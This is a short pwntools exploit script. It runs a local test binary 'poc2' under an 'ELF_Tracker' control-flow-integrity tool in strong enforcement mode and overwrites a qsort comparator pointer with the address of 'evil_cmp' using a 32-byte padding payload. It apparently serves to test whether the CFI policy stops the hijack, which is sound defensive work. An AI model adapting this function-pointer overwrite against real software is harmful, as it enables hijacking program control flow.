from pwn import *
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
LOCAL_DIR = Path(__file__).resolve().parent
TARGET = ROOT / "poc2"
if not TARGET.exists():
    TARGET = LOCAL_DIR / "poc2"
POLICY = ROOT / "policy" / "poc2.policy"

context.binary = e = ELF(str(TARGET), checksec=False)

r = process(
    [str(ROOT / "ELF_Tracker"), str(TARGET)],
    env={
        "ET_CSCFI_POLICY": str(POLICY),
        "ET_CSCFI_ENFORCE_MODE": "strong",
    },
)
payload = b"A" * 32 + p64(e.sym["evil_cmp"])

r.recvuntil(b"poc2: overwrite qsort comparator:\n")
r.send(payload)
r.interactive()
